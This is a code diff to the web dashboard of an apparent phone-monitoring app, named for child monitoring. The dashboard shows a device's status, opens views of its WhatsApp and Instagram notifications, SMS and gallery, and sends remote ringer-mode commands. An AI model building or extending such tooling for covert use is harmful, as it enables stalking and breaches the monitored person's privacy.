@@ -138,6 +138,7 @@
     </div>
 
     <script>
+        // Yahan apni Render URL confirm kar lena
         const API_BASE = 'https://child-v9no.onrender.com';
         let DEVICE_ID = localStorage.getItem('monitoring_id') || '';
 
@@ -153,14 +154,20 @@
 
         function updateDashboard() {
             if (!DEVICE_ID) return;
+            
+            // Server se data maang raha hai
             fetch(`${API_BASE}/api/device-status/${DEVICE_ID}`)
                 .then(res => res.json())
                 .then(data => {
+                    // Agar data aaya
                     if(data.id) {
                         document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
                         document.getElementById('androidVer').innerText = data.version || "--";
+                        
+                        // Online/Offline Check
                         const dot = document.getElementById('statusDot');
                         const statusText = document.getElementById('statusText');
+                        
                         if(data.isOnline) {
                             dot.className = "dot online";
                             statusText.innerText = "Connected";
@@ -170,24 +177,28 @@
                             dot.className = "dot offline";
                             statusText.innerText = "Disconnected";
                             statusText.style.color = "#ff4444";
-                            document.getElementById('networkType').innerText = "Offline";
+                            document.getElementById('networkType').innerText = "Last Seen";
                         }
+                        
+                        // Battery Update
                         const battery = data.battery || 0;
                         document.getElementById('batteryPercent').innerText = battery + "%";
                         document.getElementById('batteryFill').style.width = battery + "%";
                         document.getElementById('batteryStatus').innerText = data.charging ? "⚡ Charging..." : "🔋 On Battery";
                     }
-                });
+                })
+                .catch(err => console.log("Connection Error:", err));
         }
 
-        // --- UPDATED LOGIC FOR WHATSAPP/INSTA FILTER ---
+        // --- View Pages Kholne ka Logic ---
         function openView(page) {
             if(!DEVICE_ID) return askID();
             
             if(page === 'whatsapp' || page === 'instagram') {
-                // Ye notification page ko filter ke saath kholega
+                // Ye whatsapp/insta ke liye filter lagayega
                 window.location.href = `view_notifications.html?id=${DEVICE_ID}&filter=${page}`;
             } else {
+                // Baaki pages (sms, gallery, etc)
                 window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
             }
         }
@@ -199,6 +210,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: action })
             });
+            alert("Command Sent: " + action);
         }
 
         let modes = ['normal', 'vibrate', 'silent'];
@@ -212,13 +224,21 @@
             const text = document.getElementById('soundText');
             icon.className = `fa-solid ${icons[currentModeIndex]}`;
             text.innerText = labels[currentModeIndex];
+            
+            // Server 'normal' ko khud 'loud' mein convert kar lega
             sendCommand(modes[currentModeIndex]);
         }
 
+        // Har 5 second mein refresh
         setInterval(updateDashboard, 5000);
+        
         window.onload = () => {
-            if(DEVICE_ID) updateDashboard();
-            else askID();
+            if(DEVICE_ID) {
+                document.getElementById('currentID').innerText = DEVICE_ID;
+                updateDashboard();
+            } else {
+                askID();
+            }
         };
     </script>
 </body>
